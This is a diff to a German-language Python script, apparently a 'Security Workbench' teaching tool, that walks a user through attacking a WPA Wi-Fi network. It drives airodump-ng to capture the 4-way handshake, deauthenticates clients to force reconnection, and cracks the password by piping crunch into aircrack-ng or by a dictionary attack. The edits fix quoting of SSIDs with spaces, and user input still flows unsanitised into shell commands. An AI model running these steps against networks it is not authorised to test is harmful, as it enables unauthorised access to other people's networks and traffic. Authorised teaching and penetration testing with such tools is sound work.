@@ -48,7 +48,7 @@ def WPA_Menu():
 			str5ghz = " --band a "
 		
 		#STEP 2
-		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren): \n# ', 'airodump-ng '+str5ghz +wifi_name )
+		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren) mit der Tasten Kompination strg + c wird Aktuallisierung abgebrochen und man kann die werte einfach rauskopieren: \n# ', 'airodump-ng '+str5ghz +wifi_name )
 		execute(command)
 		router_ssid = raw_input("Bitte die Netzwerk SSID angeben: ")
 		router_chn = raw_input("Bitte die Netzwerk Kanalnummer angeben: ")
@@ -72,12 +72,19 @@ def WPA_Menu():
 		else:
 			print('Band: 2.4GHz')
 		print("\n")
-
 		#RECORD TRAFFIC
 		print("Jetzt erst beginnt der tatsächliche Angriff:")
-		command = rlinput('Aufnahme des Netzwerkverkehrs bis ein vollständiger 4-way-handshake aufgenommen wurde (Liegt der Handshake vor kann der Prozess beendet werden.): \n# ' ,'airodump-ng -c ' +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ router_ssid + ' ' + wifi_name )
+		
+		## %Broken Wenn man einen SSID eingibt die " " beinhalten muss man den nahmen kapseln damit dieser alls ganzes erkannt wird dies ist aber bei den methoden
+		## %Broken excute nicht möglich da dise wegenterpretiert wird und dann nicht mehr den vollständigen Code ausführt
+		##
+		command = rlinput('Aufnahme des Netzwerkverkehrs bis ein vollständiger 4-way-handshake aufgenommen wurde (Liegt der Handshake vor kann der Prozess beendet werden.): \n#', 'airodump-ng -c ' +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ '"' +router_ssid.replace(" ", "\s") +'"' +' ' + wifi_name )
 		execute(command)
-
+		#p = subprocess.Popen("x-terminal-emulator -e  airodump-ng -c"  +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ '"' +router_ssid +'"' +' ' + wifi_name, shell=True, stdout=subprocess.PIPE)
+		
+		#Start airodump-ng -c ' +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ router_ssid + ' ' + wifi_name
+		
+		
 		#FORCE REAUTH
 		deauthClients(router_bssid, wifi_name, 'Um einen kompletten 4-way-handshake aufzuzeichnen, muessen zuerst Clients vom Router deauthentifiziert werden, um eine erneute Authentifizierung des Clients zu provozieren: \n# ')
 
@@ -101,23 +108,22 @@ def WPA_Menu():
 
 		#Show list of CAP-Files
 		filenamestring= showCAPfiles(router_ssid)
-
-
+		
 		#BRUTEFORCING	
 		if(selection == 1):
 			print ('Für die Durchführung eines Bruteforce-Angriffs müssen zuerst folgende Parameter angegeben werden:')
 			length_min = rlinput ('Erwartete minimale Passwortlänge: ')
 			length_max = rlinput ('Erwartete maximale Passwortlänge: ')
 			alphabet = rlinput ('Zeichen die während des Bruteforce-Angriffs getestet werden sollen: ','HMacek')
-			command = rlinput('Start Bruteforce-Angriff: \n# ', 'crunch ' + length_min + ' ' + length_max + ' ' +alphabet + ' | aircrack-ng --bssid ' + router_bssid + ' -w- ' +filenamestring)
+			command = rlinput('Start Bruteforce-Angriff: \n#  crunch ' + length_min + ' ' + length_max + ' ' +alphabet + ' | aircrack-ng --bssid ' + router_bssid + ' -w- ' + '"' +filenamestring + '"')
 			execute(command)
 
 		#DICTIONARY
 		elif(selection == 2):
 			dictionary = rlinput ('Um eine Wörterbuchattacke durchzuführen, muss ein Wörterbuch angegeben werden: ', 'WIFI/dict.txt')
-			command = rlinput('Start Wörterbuchattacke: \n# ', 'aircrack-ng -w ' +dictionary+ ' -b ' +router_bssid +' ' + filenamestring )
+			command = rlinput('Start Wörterbuchattacke: \n#' , 'aircrack-ng -w ' +dictionary+ ' -b ' +router_bssid + ' ' + '"' +filenamestring + '"' )
 			execute(command)
-
+			
 		#Stop Monitor Mode
                 generics.stop_monitor_mode(wifi_name)
 		
@@ -147,7 +153,8 @@ def sql_signal_handler(signal, frame):
 	#Stop Monitor Mode
 	os.system('airmon-ng stop ' + used_interface)
 	#ReStart Networkmanager
-	os.system("service network-manager restart")
+	os.system("service networking stop && service network-manager stop")
+	os.system("service networking start && service network-manager start")
 	print('\n\n Die Security Workbench wird beendet ... \n')
 	sys.exit(0)
 
